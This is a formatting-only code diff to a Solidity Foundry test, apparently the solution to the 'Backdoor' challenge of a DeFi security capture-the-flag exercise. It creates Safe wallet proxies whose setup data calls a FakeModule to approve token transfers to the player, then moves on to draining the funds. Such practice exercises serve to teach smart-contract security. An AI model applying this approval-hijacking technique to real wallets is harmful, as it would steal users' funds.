@@ -13,6 +13,7 @@ import {stdStorage, StdStorage} from "forge-std/Test.sol";
 
 contract BackdoorChallenge is Test {
     using stdStorage for StdStorage;
+
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
@@ -88,24 +89,18 @@ contract BackdoorChallenge is Test {
                 owners,
                 1,
                 address(fakeModule),
-                abi.encodeWithSelector(
-                    FakeModule.approveFake.selector,
-                    address(token),
-                    10e18,
-                    player
-                ),
+                abi.encodeWithSelector(FakeModule.approveFake.selector, address(token), 10e18, player),
                 address(0),
                 address(0),
                 0,
                 0
             );
 
-            safeProxies[i] = address(walletFactory.createProxyWithCallback(
-                address(singletonCopy),
-                setUpData,
-                i,
-                IProxyCreationCallback(address(walletRegistry))
-            ));
+            safeProxies[i] = address(
+                walletFactory.createProxyWithCallback(
+                    address(singletonCopy), setUpData, i, IProxyCreationCallback(address(walletRegistry))
+                )
+            );
         }
 
         // Drain funds from proxies
